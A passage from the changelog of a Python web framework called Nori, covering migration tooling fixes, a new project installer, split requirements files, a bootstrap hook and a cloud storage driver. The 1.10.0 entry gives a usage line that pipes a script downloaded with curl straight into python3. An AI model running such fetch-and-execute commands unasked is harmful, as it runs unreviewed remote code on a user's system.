- **`migrate:fresh` now wipes ALL migration files** (framework + models + extras), then delegates to `migrate:init` to regenerate everything against the current DB engine. Previously preserved `migrations/framework/` — that was correct pre-1.8.0 when framework migrations shipped pre-generated, but post-1.8.0 framework migrations are user-owned and engine-specific. Their content is derived from the same framework model definitions on every machine, so regenerating is lossless. Keeps "fresh" honest to its name.

### Added
- **Repo-state lint test** (`test_repo_does_not_ship_migrations_dir`): asserts the framework repo never commits `rootsystem/application/migrations/`. The leftover `.gitkeep` files that caused the 1.8.0 → 1.10.2 silent breakage of `migrate:init` would have been caught at commit time by this test. CI fails immediately if anyone re-introduces a `migrations/` dir to the repo.
- **Dynamic-apps test** (`test_migrate_init_uses_dynamic_apps_from_tortoise_orm`, `test_migrate_upgrade_without_app_uses_dynamic_app_list`): assert that custom apps declared in `settings.TORTOISE_ORM` flow through `migrate:init` and `migrate:upgrade`.

---

## [1.10.3] — 2026-04-26

### Fixed
- **`migrate:init` now actually generates migration files on fresh projects.** Removed leftover `.gitkeep` files in `rootsystem/application/migrations/framework/` and `rootsystem/application/migrations/models/`. They were committed pre-1.8.0 (back when `migrations/framework/` shipped a pre-generated SQLite-only migration) and never removed when 1.8.0 made framework migrations user-owned. The empty-but-present directories tricked aerich's `init-db` idempotent check — it concluded "already initialized" and bailed without creating the initial migration files. Tortoise's `generate_schemas()` in the asgi lifespan was silently masking the bug by creating tables on first serve, but the missing migration baseline broke the user's first `migrate:make` later in the dev cycle.

  After this fix: `migrate:init` on a fresh project generates `migrations/framework/0_<ts>_init.py` and `migrations/models/0_<ts>_init.py` against the project's actual DB engine. Subsequent `migrate:make` commands diff against these baselines correctly.

  **Existing projects are unaffected** — their `migrations/` directories already contain real migration files and aerich's idempotent check works as intended on them.

---

## [1.10.2] — 2026-04-26

### Fixed
- **Silenced Tortoise's `RuntimeWarning: Module "X" has no models`** during `serve`, `shell`, tests, and all `migrate:*` commands. The warning is fired by Tortoise whenever a configured app has no `Model` subclasses — which is normal-by-design in Nori for fresh projects (the user's `models` app starts empty) and for apps that only consume framework models. The warning isn't actionable: real registration bugs surface as failed queries or missing tables, not as this warning. Clean boot output.
  - In-process suppression: `core/__init__.py` registers a `warnings.filterwarnings()` for the specific `Module ".+" has no models` message (RuntimeWarning category).
  - Subprocess suppression: `core/cli.py` adds a `_quiet_env()` helper that injects `PYTHONWARNINGS=ignore::RuntimeWarning` into every `aerich` subprocess call (`migrate:init`, `migrate:make`, `migrate:upgrade`, `migrate:downgrade`, `migrate:fresh`, `migrate:fix`).

---

## [1.10.1] — 2026-04-26

### Changed
- **`.env.example` defaults to SQLite** instead of MySQL. Fresh projects now boot with no external services required — `migrate:init` and `serve` work out of the box on any machine that has Python. MySQL/PostgreSQL connection settings remain in `.env.example` (commented as alternates) for users who switch later. Aligns Nori with Django/Rails/Laravel, which all default to SQLite for first run. Only affects new projects (existing projects have their own `.env` and are unaffected).

### Docs
- `docs/installation.md` notes the SQLite default and points to `docs/deployment.md` for switching to MySQL/PostgreSQL.

---

## [1.10.0] — 2026-04-26

### Added
- **`install.py` installer.** Creates clean Nori projects without inheriting framework dev artifacts (`CHANGELOG.md`, `CONTRIBUTING.md`, `AGENTS.md`, `docs/`, `mkdocs.yml`, `.github/`, the framework's own `tests/`, etc.). Pulls the latest release zip from GitHub, extracts only the paths listed in `.starter-manifest.json`, writes a project-scoped `README.md`, copies `.env.example` to `rootsystem/application/.env`, and runs `git init` so the user's first commit is theirs (not Nori's history). Hosted at `nori.sembei.mx/install.py`.
  - Usage: `curl -fsSL https://nori.sembei.mx/install.py | python3 - my-project`
  - Flags: `--no-venv` (skip env entirely; implies `--no-install`), `--no-install` (env without pip install), `--version V` (pin a specific release).
- **`.starter-manifest.json`**: declarative whitelist of files and directories that belong to a fresh project. Single source of truth for what makes up "a Nori starter" — the installer reads it from each release zip, so the manifest evolves alongside the framework.

### Changed
- **README Quick Start uses the installer instead of `git clone`.** Cloning the repo brought along framework dev files (`README.md`, `CHANGELOG.md`, `docs/`, `.github/`, `mkdocs.yml`, `tests/`, `.firebaserc`, etc.) that didn't belong in user projects, and inherited the framework's git history as the starting point. The installer is now the recommended path; cloning remains supported for framework contributors.

---

## [1.9.0] — 2026-04-24

### Added
- **`old()` Jinja helper for form re-population.** Pair `flash_old(request, form)` in the controller (after a failed `validate()`) with `{{ old('field') }}` in the template to keep what the user typed across validation errors. Sensitive fields (`password`, `password_confirmation`, `current_password`, `new_password`) are stripped from the flash by default; pass `exclude=` to override. Lives in `core/http/old.py`, registered as a Jinja global. See `docs/forms_validation.md`.
- **`python3 nori.py shell`**: async REPL via `python -m asyncio` with Tortoise pre-booted against `settings.TORTOISE_ORM` and every model in `core.registry` bound as a top-level name. `await User.all()` works at the prompt with no imports or setup. See `docs/cli.md`.
- **CLI command tests** (`tests/test_core/test_cli.py`): 16 tests covering `make:controller`, `make:model`, `make:seeder`, `migrate:init` (the regression we caught in 1.8.1), `migrate:make`, `migrate:upgrade`, `migrate:downgrade`, `migrate:fresh` DEBUG safety, and `framework:version`. Closes the test gap that let the `migrate:init` bug ship in 1.8.0. Suite: 558 → 585 total.
- **11 new tests** for the `old()` helper covering flash, default-exclude, custom-exclude, and Jinja-global integration paths.

---

## [1.8.1] — 2026-04-24

### Fixed
- **`migrate:init` now initializes both apps**. The previous implementation ran `aerich init-db` once with no `--app` flag, which only initialized the first app from `pyproject.toml` (`framework`) and silently left `models` without migrations or tables. The user app would appear "missing" until they manually invoked `aerich --app models init-db`. Fixed to loop over `('framework', 'models')` and run `init-db` per app. The loop is idempotent — apps with existing migration files are skipped, so re-running `migrate:init` is now safe.

### Docs
- Added an engine-consistency warning to `docs/database.md`: aerich migrations are engine-specific, so dev should mirror prod (don't generate against SQLite locally if you deploy to MySQL). Points users to the bundled `docker-compose.yml` for a local MySQL.

---

## [1.8.0] — 2026-04-24

### Fixed
- **`tomlkit` missing from `requirements.nori.txt`**: Aerich 0.9.2 imports `tomlkit` at runtime to read/write `pyproject.toml` during `migrate:init` / `migrate`, but does not list it as a transitive dependency. Pinning `tomlkit>=0.13` directly avoids `ModuleNotFoundError` on first install.

### Changed (BREAKING)
- **`migrations/framework/` is now user-owned, generated locally against each site's DB engine.** It has been removed from `_FRAMEWORK_DIRS` — `framework:update` no longer ships, replaces, or backs up its contents. The pre-generated `0_20260328_init.py` (which hard-coded SQLite-only `AUTOINCREMENT` syntax and broke MySQL / PostgreSQL setups with error 1064) has been removed from the repo. Each site now generates its own framework migrations via `python3 nori.py migrate:init` on first install, and via `migrate:make ... --app framework` whenever the framework adds new models.

### Docs
- Updated `docs/getting_started.md`, `docs/database.md`, and `docs/cli.md` to reflect the new flow (engine-specific migrations, `migrate:init` as a mandatory first-run step).

### Upgrade note

**For sites that successfully applied the old SQLite migration** (DB engine = SQLite, or MySQL/Postgres deployment that happened to skip the broken migration somehow): no action needed. Your `migrations/framework/0_20260328_init.py` stays in place, your `aerich` table tracks it, and future `migrate:make --app framework` commands diff against the embedded `MODELS_STATE` correctly.

**For sites that never applied the old migration** (e.g. fresh checkout on MySQL where the migration crashed with error 1064 before being recorded): delete the broken file and regenerate:

```bash
rm rootsystem/application/migrations/framework/0_20260328_init.py
python3 nori.py migrate:init
```

This generates the initial framework migration adapted to your engine and applies it.

---

## [1.7.1] — 2026-04-24

### Fixed
- **Dockerfile now copies `requirements.nori.txt`**: with the split introduced in 1.7.0, the `Dockerfile` template was still doing `COPY requirements.txt .`, which caused `pip install -r requirements.txt` to fail in the builder stage with `ERROR: -r requirements.nori.txt not found`. The COPY line now includes both files.

### Docs
- Added a **Docker** section to `docs/dependencies.md` documenting the required `COPY` line and the one-line manual fix for sites with a pre-1.7.1 `Dockerfile`.

### Upgrade note
If your site was created on Nori ≤ 1.7.0 and you use Docker, edit your `Dockerfile` in the builder stage:

```dockerfile
# before
COPY requirements.txt .

# after
COPY requirements.txt requirements.nori.txt ./
```

Nothing else in the build changes. The `Dockerfile` lives in user-land (not touched by `framework:update`) and is too opinionated per-site for the patch system to safely auto-edit it.

---

## [1.7.0] — 2026-04-24

### Added
- **Split requirements**: framework deps now live in their own `requirements.nori.txt` at the project root, and the site's `requirements.txt` inlines them via `-r requirements.nori.txt`. The new file is framework-owned (replaced on every `framework:update`, backed up under `rootsystem/.framework_backups/`), while `requirements.txt` remains user-owned — only patched once to add the `-r` line. This eliminates silent drift of framework minimums on upgrade.
- **`_FRAMEWORK_FILES` update support**: `framework:update` now handles individual files (not just directories). Extracts, backs up, and replaces any entry registered in `_FRAMEWORK_FILES` with the same semantics as `_FRAMEWORK_DIRS`.
- **Reload-safe patch system** (`core/_patches.py`): moved `_patch_bootstrap_hook_in_asgi` and the dispatcher `apply()` out of `core/cli.py` into a dedicated module. `framework_update()` clears it from `sys.modules` and re-imports it after the framework replace, so patches added in a release can actually fire on the same update that ships them — closing the first-update trap that hit 1.6.0.
- **New patcher `_patch_requirements_dash_r_to_nori`**: idempotently prepends `-r requirements.nori.txt` to an existing `requirements.txt` on upgrade, preserving any user deps and comments.
- **Dependencies docs** (`docs/dependencies.md`): rationale for the split, how to add site deps, activating optional drivers, stricter pins, upgrade path, dev deps.
- 7 new tests for the requirements patcher (idempotency, leading comments, missing file, full `apply()` runs) and for the patcher error-isolation path. Suite: 551 → 558 total.

### Changed
- `core/cli.py` no longer contains patch logic. `framework_update()` imports `core._patches` via `importlib` after clearing `sys.modules`, so the freshly-installed bytecode runs.
- `requirements.txt` in the framework repo is now the scaffold template: starts with `-r requirements.nori.txt`, optional drivers commented, placeholder section for site deps.

### Upgrade note
- **Coming from ≤ 1.6**: the first `framework:update` to 1.7.0 still requires the two-step run (`framework:update` then `framework:update --force`) because the old `cli.py` in memory does not know about the reload trick. After that, patches apply automatically on every update — the trap is closed from 1.7 onwards.
- Your existing `requirements.txt` is preserved. After the patch, it will start with `-r requirements.nori.txt` and your old deps remain below. pip deduplicates entries that also appear in `requirements.nori.txt`; stricter pins in your file still win. You may optionally remove the framework entries from your file to keep it clean.

---

## [1.6.0] — 2026-04-24

### Added
- **Bootstrap hook** (`core/bootstrap.py`): optional `rootsystem/application/bootstrap.py` with a top-level `bootstrap()` function runs as the very first thing in the ASGI entry point, before Starlette, Tortoise, or any other third-party import. This is the correct moment to initialise observability SDKs (Sentry, Datadog, OpenTelemetry) that patch libraries at import time. The hook is optional — if the file is absent, `load_bootstrap()` is a no-op; if it imports or raises, a warning is logged on `nori.bootstrap` and the app still starts.
- **`framework:update` patch system**: after replacing the framework directories, the update command now applies idempotent patches to user-land files so new core features that need a hook in `asgi.py` are wired up automatically. First patch: injects the bootstrap hook call into `asgi.py` after the `from __future__` import and module docstring, preserving any user customizations. A timestamped backup is kept in `rootsystem/.framework_backups/`.
- **Observability docs** (`docs/observability.md`): rationale for the hook design, the Sentry recipe end-to-end, notes on Datadog (`ddtrace-run`) and OpenTelemetry, and the upgrade path for sites on Nori ≤ 1.5.
- 16 new tests for the bootstrap loader (file absent, function present, idempotency, missing function, raising hook, import error, syntax error) and the asgi.py patcher (injection positions, idempotency, missing file, syntax error, AST validity of the patched output). Suite: 535 → 551 total.

### Upgrade note
- **First-time upgrade to 1.6.0 requires two steps** (`framework:update` then `framework:update --force`). The running Python process has the OLD `cli.py` in memory, so the patcher shipped in 1.6.0 does not fire on the same run that installs 1.6.0. The `--force` re-run executes under the new `cli.py` and applies the patch. This is a one-time quirk — from 1.6.x onwards patches run automatically. See [docs/observability.md](https://nori.sembei.mx/observability/#upgrading-an-existing-site).

---

## [1.5.0] — 2026-04-21

### Added
- **Google Cloud Storage driver** (`services/storage_gcs.py`): native GCS storage backend using service account JWT → OAuth2 access token exchange (no `google-cloud-storage` SDK). Signs RS256 JWTs with the service account's private key, caches the 1-hour Bearer token in-process with async-safe refresh 60 s before expiry, and uploads via the GCS XML API (`PUT https://storage.googleapis.com/{bucket}/{key}`). Supports loading credentials from a file (`GCS_CREDENTIALS_FILE`) or an inline JSON string (`GCS_CREDENTIALS_JSON`) for containerised deployments. Optional `GCS_URL_PREFIX` for CDN-fronted public URLs.
- 16 new tests for the GCS driver covering JWT construction and signature verification with a real throwaway RSA keypair, token caching and refresh logic, credentials loading precedence, and upload URL construction. Suite: 519 → 535 total.

### Changed
- `requirements.txt` lists `cryptography>=42.0` as an optional dep (commented) — only required when enabling the GCS driver. Dev dependency pinned in `requirements-dev.txt` so CI runs the new tests.

---

## [1.4.0] — 2026-04-10

### Added
- **Async validation** (`validate_async`): superset of `validate()` that supports database-dependent rules. Runs sync rules first, then async rules only for fields that passed.
- **`unique` validation rule**: checks value uniqueness against the database. Syntax: `unique:table,column` or `unique:table,column,except_id` for updates. SQL injection protected via identifier validation.
- **`routes:list` CLI command**: prints a table of all registered routes with path, methods, and name. Supports `Route`, `Mount` (recursive), and `WebSocketRoute`.
- **Middleware documentation** (`docs/middleware.md`): full middleware stack reference, parameter docs for all built-in middleware, custom middleware guide with ASGI patterns.
- 11 new tests (508 → 519 total).

---

## [1.3.1] — 2026-04-10

### Added
- **Testing utilities** (`core.testing`): `create_test_client()`, `setup_test_db()` / `teardown_test_db()`, `authenticate()` with signed session cookies, `authenticate_api()`, `ModelFactory` base class, `assert_redirects()` / `assert_json_error()`, `clear_authentication()`.
- 90 new tests: validation rules (34), Redis queue (8), CLI plugins (11), testing module (26), mail_resend service (4), storage_s3 service (7). Suite: 418 → 508 total.
- GitHub Actions CI running on Python 3.9, 3.12, and 3.14.

### Fixed
- `asyncio.iscoroutinefunction` replaced with `inspect.iscoroutinefunction` (deprecated Python 3.14, removed 3.16).
- `authenticate()` now creates real signed session cookies compatible with `@login_required` and `@require_role` (previously used non-functional `X-Test-*` headers).
- Session cookie cleared before re-authenticating to avoid duplicates across httpx versions.
- `datetime.utcnow()` replaced with `tortoise.timezone.now()` in getting_started tutorial seeder.
- `index.md`: removed hardcoded line count, added venv/.env to Quick Start, added missing features to Key Features section.
- `.env.example`: added `QUEUE_DRIVER`, `CACHE_MAX_KEYS`, `TRUSTED_PROXIES`, consolidated `REDIS_URL`.

---

## [1.3.0] — 2026-04-10

### Added
- **Redis queue driver**: `QUEUE_DRIVER=redis` enables near-instant job pickup via BRPOP, delayed jobs via sorted sets, and a dead letter list at `nori:queue:{name}:failed`. The worker auto-dispatches to database or Redis based on config.
- **CLI plugin system**: Custom commands now live in `commands/*.py` and survive `framework:update`. Each file exports `register(subparsers)` and `handle(args)`. Files prefixed with `_` are skipped. Example provided at `commands/_example.py`.
- **8 new validation rules**: `url`, `date` (ISO 8601), `confirmed` (field_confirmation pattern), `nullable` (skip all rules if empty), `array`, `min_value:N` / `max_value:N` (numeric range), `regex:pattern`.
- **Testing utilities** (`core.testing`): `create_test_client()`, `setup_test_db()` / `teardown_test_db()`, `authenticate()` / `authenticate_api()`, `ModelFactory` base class, `assert_redirects()` / `assert_json_error()` assertion helpers.
- 76 new tests covering all new features (418 → 494 total).

### Fixed
- `file_max` validation rule no longer crashes the server on invalid size values — `ValueError` from `_parse_size` is caught and returned as a validation error.

---

## [1.2.5] — 2026-04-10

### Fixed
- Documentation: corrected `@inject()` resolution order, removed non-existent Redis queue driver reference, fixed WebSocket `on_receive` → `on_receive_json` example, fixed `Content-Type` → `Accept` header reference in auth decorators.
- Documentation: fixed logging text format example to match actual formatter output.
- `docker-compose.yml` now includes `MYSQL_USER` and `MYSQL_PASSWORD` for the db service.

### Changed
- All 5 service drivers (`mail_resend`, `storage_s3`, `oauth_github`, `oauth_google`, `search_meilisearch`) now use `core.conf.config` instead of `import settings` directly, consistent with the core decoupling convention.
- Test dependencies (`pytest`, `pytest-asyncio`) moved to `requirements-dev.txt`. Production installs no longer include test tooling.

### Added
- Documentation for previously undocumented features: `run_in_background()`, `background_tasks()`, rate-limit response headers (`X-RateLimit-*`), `validate()` custom messages parameter, `framework:update --force` flag, `tree(root_id=)` subtree parameter, HSTS `includeSubDomains` directive and `hsts`/`csp` constructor params, 5 missing framework loggers.
- Warning in CLI docs about `framework:update` overwriting custom commands in `core/cli.py`.

---

## [1.2.4] — 2026-04-08

### Fixed
- `migrate:fresh` now re-creates the empty database after dropping it, fixing a failure on MySQL/Postgres where `aerich init-db` would error because the database no longer existed.

---

## [1.2.3] — 2026-04-08

### Added
- `migrate:fix` command to synchronize Aerich migration files with the current model state.
- `migrate:fresh` command (robust version) to wipe the database, delete application migrations, and re-initialize the system. Includes safety checks for `DEBUG=true` and user confirmation.

---

## [1.2.2] — 2026-04-06

### Fixed
- Memory queue driver now executes jobs via `asyncio.create_task()` — previously created a `BackgroundTask` that was never attached to a Response, so enqueued jobs silently never ran.

### Changed
- CLI logic moved from `nori.py` to `core/cli.py`. The entry point is now a thin bootstrap that delegates to core, so the CLI self-updates with `framework:update`.
- Repository migrated from GitLab to GitHub. All URLs, API calls, and documentation updated accordingly.
- `framework:update` now uses the GitHub Releases API.

### Note
Projects on v1.2.1 or earlier need to manually replace `nori.py` once with the new bootstrap version. After that, all future updates are automatic.

---

## [1.2.1] — 2026-03-28

### Added
- `audit:purge` command for cleaning audit log entries older than N days, with `--export` (CSV) and `--dry-run` options.
- `--force` flag for `framework:update` to re-install even when already on the target version.
- Database indexes on `AuditLog` for `user_id`, `action`, `model_name`, and `created_at`.

### Fixed
- Backup path collision in `framework:update` when running multiple updates on the same version.
- Regenerated framework init migration with correct Aerich `MODELS_STATE`.

---

[1.4.0]: https://github.com/sembeimx/nori/releases/tag/v1.4.0
[1.3.1]: https://github.com/sembeimx/nori/releases/tag/v1.3.1
[1.3.0]: https://github.com/sembeimx/nori/releases/tag/v1.3.0
[1.2.5]: https://github.com/sembeimx/nori/releases/tag/v1.2.5
[1.2.4]: https://github.com/sembeimx/nori/releases/tag/v1.2.4
[1.2.3]: https://github.com/sembeimx/nori/releases/tag/v1.2.3
[1.2.2]: https://github.com/sembeimx/nori/releases/tag/v1.2.2
[1.2.1]: https://github.com/sembeimx/nori/releases/tag/v1.2.1
